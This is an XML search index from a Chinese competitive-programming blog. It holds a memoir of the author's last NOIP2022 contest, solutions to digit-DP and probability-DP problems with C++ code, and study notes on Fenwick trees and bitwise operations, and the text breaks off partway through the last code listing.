<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AFter OI - NOIP2022 游记</title>
    <url>/afo/</url>
    <content><![CDATA[<blockquote>
<p>每一个少年终将梦醒</p>
</blockquote>
<p>参加了最后一次 OI 系列的考试，终于也 AFO 了。几年伴随我的 OI
历程也在此结束。梦结束了。</p>
<p>接下来 whk 加油！</p>
<span id="more"></span>
<h1 id="考试">考试</h1>
<p>由于疫情，NOIP2022
并未在成都考，考点设立在绵阳南山中学。于是我们还需要提早几天去绵阳准备。随着整个
JKFOI
入住酒店，吃了好几天的外卖。同时也是第一次见到了高一的学弟学妹们。</p>
<p>考前的几天并不好过，每天都写不进去题，WakaTime
的每日统计时间也大幅下降，也就考前一天的数据相较之前可看了。每天吃外卖没啥蔬菜，营养也不均衡，导致心理一直挺焦虑的。</p>
<p>考试当天早上 7:25 才起床
<del>设了闹钟但只在工作日响</del>，原本起床后再复习一下板子的计划直接泡汤了。直接火速洗漱收拾行李带着早饭赶到车上。到考场之前都还没把面包吃完。</p>
<p>来到考场后不久就开始考试了。先花了 10min 读了前两题。看 T1
没啥思路，就手动算了一下一张图中 C 和 F
的个数。不一会儿就想到了可以统计每一行连续可选点的个数。然后对于每一列向上统计可选的每行可选点的方案数。对于每个点将两个相乘就是以该点为左下角的
C 的方案数。接着由于 F 即为 C
的左下角加一个竖线，我们可以统计每一列向下可选点的个数，将其与 C
相乘就是 F 的方案数。于是 T1 大概花了 30min 就切掉了。复杂度 <span
class="math inline">\(O(n^2)\)</span>。</p>
<p>接下来看 T2，<span class="math inline">\(k = 2n - 2\)</span>
的情况并不难想。空出来一个栈，然后将其它的栈的元素个数限定在 <span
class="math inline">\(2\)</span>
以内，每遇到相同的就消去即可。花了一点时间把这 <span
class="math inline">\(15\text{pts}\)</span>
的部分分打了，于是开始想正解。然而想了好一会儿都没想出来。就把这改了一下看能不能骗点后面的分。</p>
<p>接下来看 T3。一眼看出来要用 Tarjan 边双连通分量缩点 + 树形 DP
计数。于是开始写 Tarjan，但始终写不对。想着写出 Tarjan
要花一定时间加上树形 DP
也可能写挂，于是果断换成暴力。直接状压存点加上必守边判断，复杂度 <span
class="math inline">\(O(nm2^n)\)</span>，预估可得 <span
class="math inline">\(35\text{pts}\)</span>。</p>
<p>然后看了 T4，先敲了一颗线段树打了 <span class="math inline">\(O(qn^2
\log n)\)</span> 的暴力，预估 <span
class="math inline">\(8\text{pts}\)</span>，然后看后面的数据点看似可以预处理优化。把线段树预处理了，优化到
<span class="math inline">\(\Theta (qn^2 + n^2 \log n)\)</span>，把
<span class="math inline">\(l\)</span> 预处理后优化到了 <span
class="math inline">\(\Theta (qn + n^2 \log n)\)</span>，在把 <span
class="math inline">\(r\)</span> 预处理后就可优化到 <span
class="math inline">\(O(n^2 \log n)\)</span> 了，预估得分 <span
class="math inline">\(20\text{pts}\)</span>。</p>
<p>最后半小时留给想 T2，最后仍然没想出来就检查了一下文件，最后一场 OI
考试就结束了。预估得分为 <span class="math inline">\(100 + 15 + 35 + 20
= 170\)</span>，省一应该没问题。</p>
<p>回家后测了一下民间数据，发现 T2 不知道为啥写挂了
QWQ，于是预估得分变为了 <span class="math inline">\(100 + [0, 15] + 35 +
20 = [155, 170]\)</span>。之后看了一下小图灵估分 <span
class="math inline">\(165\)</span> 省一，InfOJ / MarsOJ 估分 <span
class="math inline">\(170\)</span>，好受些了。</p>
<p>接下来就该回学校，进行长达一个月（可能更长）的 whk 恶补了。</p>
<p><strong>Upd on Dec. 7th 2022</strong></p>
<p>分数出来了，<span class="math inline">\(100 + 0 + 35 + 20 =
155\)</span>，确实省一了，但 T2 一分没得 QWQ</p>
<h1 id="回忆">回忆</h1>
<p><del>接下来有点偏向碎碎念了 QWQ</del></p>
<p>小学的时候对编程很感兴趣，学了 Scratch，也接触了一点 C
语言。这也促使我走上了 OI 的道路。</p>
<p>到了初中，我加入了 XCSYOI，作为这个学校的第一届学生也是第一届
OIer，开始了系统的 OI
训练。初一时阴差阳错地成为了当年学校中为数不多的进入复赛的一员，拿了普及组的省二。然而我们初中以
whk
优异闻名，竞赛倒是其次。这就导致了文化课学业多，竞赛训练时间少，学的知识也学得很浅很少，甚至直到初中毕业连图论都没教。于是初中时拿了三个省二就退役了。</p>
<p>中考失利，于是来到了成都教科院附中的 JKFOI。认识了更多的
OIer，也有了更多的训练时间。但随着一学期的结束，我们这届的 OIer
仅剩三人。在高一拿省一的一个都没有。这是强省非强校的通病——自学。没有国集学长教，没有金牌教练带，学习刷题也只能靠自己。虽说也能出现像上一届
ympc2005 的 NOI 银牌大佬，但这只属于疯狂停课练习外培的个例。</p>
<p>于是我们剩下的几个人开始组建了 JKFOJ，启用了每日亿题和 Joker Fool
Round
组题赛，买了蓝书慢慢啃，停晚自习停政史地来机房练习。直到后面晚上熬夜打
Codeforces 和完全停课。水平渐长。</p>
<p>参加外培，第一次在高一国庆，那时什么都听不懂，硬是罚做了六天。第二次是高二暑假，由于疫情改为了线上外培，逐渐开始能理解讲的内容，也能做出来一些题了。</p>
<p>于是开始参加竞赛。从 2021 的 CSP 爆炸到 NOIP，又从 2022 的 CSP
的低级错误直到最后一次参加
NOIP，中途犯下了不少的失误。我是一个毛病挺多，也比较粗心的人，竞赛就把这些问题显现出来了，之前的游记中也有写到。</p>
<p>但 OI
毕竟是竞赛。每个省从初赛的几千人，到几百人参加复赛，又到几十人拿到省一参加省选，最终组成十几人的省队。强的留下来，弱的被淘汰。不能晋级只能说明还不够强。胜者赢得光辉耀眼，获得名声成就；败者输的彻头彻尾，退出竞赛舞台；只要一步出了差错就被甩到千里之外。竞赛的本质何尝是如此呢。</p>
<p>从初中怀梦，直到现在梦醒。中途 OI
或成调味，或成主菜，陪伴了许多实现。为了 OI，我失去了许多。但也因为
OI，即使被淘汰，我也得到了许多、学到了许多。如果问我再一次从头成为一名
OIer，答案肯定是愿意的。</p>
<p>我终究没有过人的实力，无法冲击四川省队。感谢 OI
为我带来的一切，感谢老师、教练和家长对我的支持。每一个少年或将怀梦，每一个少年终将梦醒。忆梦之繁华，坚定前方之道路。OI
的历程终将结束，接下来就是 AFter OI 的时间了。</p>
<p>OI 已结束，whk 加油！</p>
<p>AFOed on Nov. 26th 2022.</p>
]]></content>
      <categories>
        <category>日常</category>
        <category>行记</category>
      </categories>
      <tags>
        <tag>日常</tag>
        <tag>行记</tag>
        <tag>NOIP</tag>
        <tag>2022</tag>
        <tag>AFO</tag>
      </tags>
  </entry>
  <entry>
    <title>「AHOI2009」同类分布 - 数位 DP</title>
    <url>/ahoi2009-similar/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P4127">洛谷链接</a></p>
<p>给出两个数 <span class="math inline">\(a,b\)</span>，求出 <span
class="math inline">\([a, b]\)</span>
中各位数字之和能整除原数的数的个数。</p>
<p>数据范围：<span class="math inline">\(1 \le a \le b \le
10^{18}\)</span></p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题显然数位 DP。可转化为求小于等于 <span
class="math inline">\(n\)</span>
的各位数字之和能整除原数的数的个数。直接求本题所问过于困难，可以拆分为求各数位和为
<span class="math inline">\(\text{sum}\)</span> 且该数可被 <span
class="math inline">\(\text{sum}\)</span> 整除的数的个数，然后枚举可行的
<span class="math inline">\(\text{sum}\)</span> 即可。</p>
<p>在有 <span class="math inline">\(\text{sum}\)</span> 限制下，我们设
<span class="math inline">\(f_{i, s, m, c}\)</span> 表示遍历到第 <span
class="math inline">\(i\)</span> 位，前 <span class="math inline">\(i -
1\)</span> 位数字和为 <span class="math inline">\(s\)</span>，且当前数
<span class="math inline">\(\mod \text{sum}\)</span> 的余数为 <span
class="math inline">\(m\)</span> 情况下的满足条件的数的个数。<span
class="math inline">\(c\)</span> 表示前 <span
class="math inline">\(i\)</span> 位是否达到 <span
class="math inline">\(n\)</span> 的上限：<span
class="math inline">\(0\)</span> 表示未达到，<span
class="math inline">\(1\)</span> 表示达到。假设 <span
class="math inline">\(k\)</span> 为第 <span
class="math inline">\(i\)</span> 位数组（<span class="math inline">\(c =
0\)</span> 则 <span class="math inline">\(0 \le k \le 9\)</span>，<span
class="math inline">\(c = 1\)</span> 则 <span class="math inline">\(0
\le k \le n_i\)</span>）（<span class="math inline">\(n_i\)</span> 表示
<span class="math inline">\(n\)</span> 的第 <span
class="math inline">\(i\)</span> 位），于是我们可以推出以下方程：</p>
<p><span class="math display">\[
f_{i + 1, s + k, (m \times 10 + k) \bmod \text{sum}, [c = 1 \wedge k =
n_{i + 1}]} = f_{i + 1, s + k, (m \times 10 + k) \bmod \text{sum}, [c =
1 \wedge k = n_{i + 1}]} + f_{i, s, m, c}
\]</span></p>
<p>最后我们只需要初始化 <span class="math inline">\(f_{i, s, m, c} = [i
= 0 \wedge s = 0 \wedge m = 0 \wedge c = 1]\)</span>，然后对于每个 <span
class="math inline">\(\text{sum}\)</span>，我们将 <span
class="math inline">\(f_{n, \text{sum}, 0, 0} + f_{n, \text{sum}, 0,
1}\)</span> 相加即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">long</span> <span class="type">long</span> <span class="title">solve</span><span class="params">(<span class="type">long</span> <span class="type">long</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; bit = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (; k; k /= <span class="number">10</span>, n++) bit.<span class="built_in">push_back</span>(k % <span class="number">10</span>);</span><br><span class="line">    std::<span class="built_in">reverse</span>(bit.<span class="built_in">begin</span>() + <span class="number">1</span>, bit.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">long</span> <span class="type">long</span> f[MAXN][<span class="number">9</span> * MAXN][<span class="number">9</span> * MAXN][<span class="number">2</span>];</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> sum = <span class="number">1</span>; sum &lt;= n * <span class="number">9</span>; sum++) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(f, <span class="number">0</span>, <span class="built_in">sizeof</span>(f));</span><br><span class="line">        f[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> s = <span class="number">0</span>; s &lt;= sum; s++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">0</span>; m &lt; sum; m++) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">0</span>; c &lt;= <span class="number">1</span>; c++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (f[i][s][m][c]) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt;= (c ? bit[i + <span class="number">1</span>] : <span class="number">9</span>); k++) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (s + k &gt; sum) <span class="keyword">break</span>;</span><br><span class="line">                                f[i + <span class="number">1</span>][s + k][(m * <span class="number">10</span> + k) % sum][c &amp;&amp; (k == bit[i + <span class="number">1</span>])] += f[i][s][m][c];</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ans += f[n][sum][<span class="number">0</span>][<span class="number">0</span>] + f[n][sum][<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> l, r;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld %lld&quot;</span>, &amp;l, &amp;r);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, <span class="built_in">solve</span>(r) - <span class="built_in">solve</span>(l - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>数位 DP</tag>
        <tag>省选</tag>
        <tag>AHOI</tag>
        <tag>2009</tag>
      </tags>
  </entry>
  <entry>
    <title>树状数组学习笔记</title>
    <url>/binary-index-trees-notes/</url>
    <content><![CDATA[<h1 id="概念">概念</h1>
<p>树状数组是一种维护线性数组前缀和的特殊方法，使用了类似于快速幂等的二进制分组的优势，对数组进行分段，从而可以快速求出该数组的前缀和的树形数据结构。</p>
<p>这一点与线段树类似。树状数组能干的事情线段树都能干，线段树能干的事情树状数组不一定能干。但树状数组相对线段树代码更短更好写，故在只涉及单点修改的时候树状数组更常用。</p>
<span id="more"></span>
<p>树状数组的工作原理如下图（图片引用自 OI Wiki）：</p>
<p><img src="https://oi-wiki.org/ds/images/fenwick.svg" /></p>
<p>将 <span class="math inline">\(a\)</span> 数组分为图示若干段，其中
<span class="math inline">\(c\)</span> 数组存的是区间和。</p>
<h1 id="前置知识">前置知识</h1>
<a href="/bitwise-operator-notes/" title="详见之前《位运算学习笔记》博客">详见之前《位运算学习笔记》博客</a>
<p>这里想补充一点，就是 lowbit 计算。</p>
<p>lowbit 计算的目的是求出一个数在二进制下最后一位 1 和之后的所有 0
所组成的数。</p>
<p>具体求法为 <code>x = x &amp; -x</code>，接下我将会利用数字 20
解释其原理。</p>
<p>首先将 20 的二进制表示出来，为 010100。</p>
<p>然后将 20 的负数表示出来，在补码的表示方法为将 20 按位取反，再
+1，即为 101100。</p>
<p>再将两个数进行与运算，得到二进制数 000100，十进制数为 4。该数即为 20
在二进制下的最后一个 1 和之后的 0 所组成的数。</p>
<p>lowbit 计算为树状数组的基础运算。</p>
<h1 id="实现方法">实现方法</h1>
<p>那么怎么实现对数组的分段？这里就需要使用之前介绍的 <span
class="math inline">\(\text{lowbit}\)</span> 计算。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &amp; -x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>树状数组支持两种操作：单点修改，前缀求和。</p>
<h2 id="初始化">初始化</h2>
<p>首先在使用树状数组之间，我们需要将其初始化。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> c[MAXN + <span class="number">1</span>];    <span class="comment">//存储区间和</span></span><br><span class="line"><span class="built_in">memset</span>(c, <span class="number">0</span>, <span class="built_in">sizeof</span>(c));</span><br></pre></td></tr></table></figure>
<h2 id="单点修改">单点修改</h2>
<p>树状数组可以将单点单独加一个值，例如修改 <span
class="math inline">\(a_5\)</span>
工作原理如下（对应上图序号）（画图丑请见谅）：</p>
<pre class="mermaid">
graph LR
a5 --&gt; c6 --&gt; c8
</pre>
<p>即为逐级上升，在经过的结点都加上这个值即可。</p>
<p>关于如何求上升后的坐标，使用 <span
class="math inline">\(\text{lowbit}\)</span> 即可。</p>
<p><span class="math display">\[
\begin{cases}
5 + \text{lowbit}(5) = 6 &amp; a_5 \rightarrow c_6 \\
6 + \text{lowbit}(6) = 8 &amp; c_6 \rightarrow c_8
\end{cases}
\]</span></p>
<p>代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (x &lt;= n) &#123;    <span class="comment">// 防止数组越界</span></span><br><span class="line">        c[x] = c[x] + k;</span><br><span class="line">        x = x + <span class="built_in">lowbit</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="前缀查询">前缀查询</h2>
<p>树状数组最主要的功能就是求前缀和，例如查询 <span
class="math inline">\(a_7\)</span> 工作原理如下：</p>
<pre class="mermaid">
graph LR
a7 --&gt; c6 --&gt; c4
</pre>
<p>即为不停地查询上一层的前一个，同时将值加入最终结果即可。</p>
<p>求前一层的前一个也可以使用前缀和：</p>
<p><span class="math display">\[
\begin{cases}
7 - \text{lowbit}(7) = 6 &amp; a_7 \rightarrow c_6 \\
6 - \text{lowbit}(6) = 4 &amp; c_6 \rightarrow c_4
\end{cases}
\]</span></p>
<p>代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">getsum</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">        ans = ans + c[x];</span><br><span class="line">        x = x - <span class="built_in">lowbit</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上为树状数组最基础的操作</p>
<h1 id="例题">例题</h1>
<p><a href="https://www.luogu.com.cn/problem/P3374">洛谷 P3374
【模板】树状数组 1</a></p>
<p>简单的模板题，结合上面的知识即可 AC。代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">500000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> c[MAXN + <span class="number">1</span>], n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &amp; -x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (x &lt;= n) &#123;</span><br><span class="line">        c[x] = c[x] + k;</span><br><span class="line">        x = x + <span class="built_in">lowbit</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">getsum</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">        ans = ans + c[x];</span><br><span class="line">        x = x - <span class="built_in">lowbit</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="built_in">memset</span>(c, <span class="number">0</span>, <span class="built_in">sizeof</span>(c));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, x; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">        <span class="built_in">add</span>(i, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">        <span class="type">int</span> m, x, y;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;m, &amp;x, &amp;y);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (m == <span class="number">1</span>) <span class="built_in">add</span>(x, y);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">getsum</span>(y) - <span class="built_in">getsum</span>(x - <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>学习笔记</tag>
        <tag>数据结构</tag>
        <tag>树状数组</tag>
      </tags>
  </entry>
  <entry>
    <title>位运算学习笔记</title>
    <url>/bitwise-operator-notes/</url>
    <content><![CDATA[<blockquote>
<p>《<算法竞赛进阶指南> 0x01 位运算》读后感</p>
</blockquote>
<h1 id="补码">补码</h1>
<p>计算机中的整数均使用补码存储，位运算时也不例外。</p>
<p>故十六进制中大于 0x7FFFFFFF 时就为负数。</p>
<p>在 <code>memset(src, val, len)</code> 中是将 <code>val</code>
不停循环地填入 <code>src</code>，且 0x00 &lt; <code>val</code> &lt;
0xFF。</p>
<p>故可以将 0x3F 定义为一个很大的数，即为 <code>INF</code>。</p>
<span id="more"></span>
<h1 id="位运算的妙用">位运算的妙用</h1>
<h2 id="快速幂">快速幂</h2>
<p>当计算 <span class="math inline">\(a^b\)</span> 时 <span
class="math inline">\(b\)</span> 可以被分成 <span
class="math inline">\(b = x_0 \times 2^0 + x_1 \times 2^1 + x_2 \times
2^2 + \cdots + x_n \times 2^n\)</span>，故可以用位运算剥离 <span
class="math inline">\(b\)</span> 在二进制下的位数，代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">power</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b,<span class="type">int</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">1</span> % p;</span><br><span class="line">    <span class="keyword">while</span> (b &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (b &amp; <span class="number">1</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            ans = ((<span class="type">long</span> <span class="type">long</span>)ans * a) % p;</span><br><span class="line">        &#125;</span><br><span class="line">        a = ((<span class="type">long</span> <span class="type">long</span>)a * a) % p;</span><br><span class="line">        b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="二进制状态压缩">二进制状态压缩</h1>
<p>一个集合中的元素可以使用 <code>1</code> 表示选择，用 <code>0</code>
表示不选择。</p>
<p>故当拥有一个 <span class="math inline">\(n\)</span>
个元素的集合时，可使用一个位数为 <span class="math inline">\(n\)</span>
的二进制数来枚举全部的子集，即为 <span
class="math inline">\(2^n\)</span> 的十进制数。</p>
<p>此时可以用一个整型数代替布尔数组，也可以使用一个整型数枚举全排列。</p>
<p>下面的列表列举了常用操作。</p>
<table>
<colgroup>
<col style="width: 75%" />
<col style="width: 24%" />
</colgroup>
<thead>
<tr class="header">
<th>操作</th>
<th>运算（运算符为 C++）</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>取出整数 <span class="math inline">\(n\)</span> 在二进制表示下的第
<span class="math inline">\(k\)</span> 位</td>
<td><code>（n &gt;&gt; k） &amp; 1</code></td>
</tr>
<tr class="even">
<td>取出整数 <span class="math inline">\(n\)</span> 在二进制表示下的第
<span class="math inline">\(0 \sim k - 1\)</span> 位（后 <span
class="math inline">\(k\)</span> 位）</td>
<td><code>n &amp; ((1 &lt;&lt; k) - 1)</code></td>
</tr>
<tr class="odd">
<td>把整数 <span class="math inline">\(n\)</span> 在二进制表示下的第
<span class="math inline">\(k\)</span> 位取反</td>
<td><code>n ^ (1 &lt;&lt; k)</code></td>
</tr>
<tr class="even">
<td>对整数 <span class="math inline">\(n\)</span> 在二进制表示下的第
<span class="math inline">\(k\)</span> 位赋值 <span
class="math inline">\(1\)</span></td>
<td><code>n \| (1 &lt;&lt; k)</code></td>
</tr>
<tr class="odd">
<td>对整数 <span class="math inline">\(n\)</span> 在二进制表示下的第
<span class="math inline">\(k\)</span> 位赋值 <span
class="math inline">\(0\)</span></td>
<td><code>n &amp; (~(1 &lt;&lt; k))</code></td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>OI</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>学习笔记</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title>「BZOJ 3029」守卫者的挑战 - 概率与期望</title>
    <url>/bzoj-3029/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://hydro.ac/d/bzoj/p/3029">HydroOJ 链接</a></p>
<p>打开了黑魔法师 Vani 的大门，队员们在迷宫般的路上漫无目的地搜寻着关押
applepi
的监狱的所在地。突然，眼前一道亮光闪过。“我，Nizem，是黑魔法圣殿的守卫者。如果你能通过我的挑战，那么你可以带走黑魔法圣殿的地图……”瞬间，队员们被传送到了一个擂台上，最初身边有一个容量为
<span class="math inline">\(k\)</span> 的包包。</p>
<p>擂台赛一共有 <span class="math inline">\(n\)</span>
项挑战，各项挑战依次进行。第 <span class="math inline">\(i\)</span>
项挑战有一个属性 <span class="math inline">\(a_i\)</span>，如果 <span
class="math inline">\(a_i \ge
0\)</span>，表示这次挑战成功后可以再获得一个容量为 <span
class="math inline">\(a_i\)</span> 的包包；如果 <span
class="math inline">\(a_i=-1\)</span>，则表示这次挑战成功后可以得到一个大小为
<span class="math inline">\(1\)</span>
的地图残片。地图残片必须装在包包里才能带出擂台，包包没有必要全部装满，但是队员们必须把获得的所有的地图残片都带走（没有得到的不用考虑，只需要完成所有
<span class="math inline">\(n\)</span>
项挑战后背包容量足够容纳地图残片即可），才能拼出完整的地图。并且他们至少要挑战成功
<span class="math inline">\(l\)</span> 次才能离开擂台。</p>
<p>队员们一筹莫展之时，善良的守卫者 Nizem
帮忙预估出了每项挑战成功的概率，其中第 <span
class="math inline">\(i\)</span> 项挑战成功的概率为 <span
class="math inline">\(p_i\%\)</span>。现在，请你帮忙预测一下，队员们能够带上他们获得的地图残片离开擂台的概率。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题可 DP 解决。我们设 <span class="math inline">\(f_{i, j,
m}\)</span> 为遍历到第 <span class="math inline">\(i\)</span>
次挑战时，成功了 <span class="math inline">\(j\)</span> 次，剩余背包为
<span class="math inline">\(m\)</span> 时的概率。<span
class="math inline">\(m\)</span>
可以为负，可从计入答案的后面成功的挑战中补回来。</p>
<p>最终答案为 <span class="math inline">\(\sum\limits_{i =
l}^n{\sum\limits_{j \ge 0}{f_{n, i, j}}}\)</span>。</p>
<p>显然状态转移方程如下：</p>
<p><span class="math display">\[
f_{i, j + 1, m + a_i} = f_{i, j + 1, m + a_i} + f_{i - 1, j, m} \times
p_i \\
f_{i, j, m} = f_{i, j, m} + f_{i - 1, j, m} \times (1 - p_i)
\]</span></p>
<p>在写代码的时候可以优化两点：</p>
<ul>
<li>为避免下标为负，可将所有下标 <span class="math inline">\(m\)</span>
增加一个常值 <span class="math inline">\(\text{MAXN}\)</span>。</li>
<li>为避免越界，可将背包边界限定为 <span
class="math inline">\(\text{MAXN} +
n\)</span>，限定为该值可在不越界的情况下统计答案时将所有的合法背包容量统计纳入统计。</li>
</ul>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, l, k;</span><br><span class="line">    <span class="type">static</span> <span class="type">double</span> p[MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> a[MAXN + <span 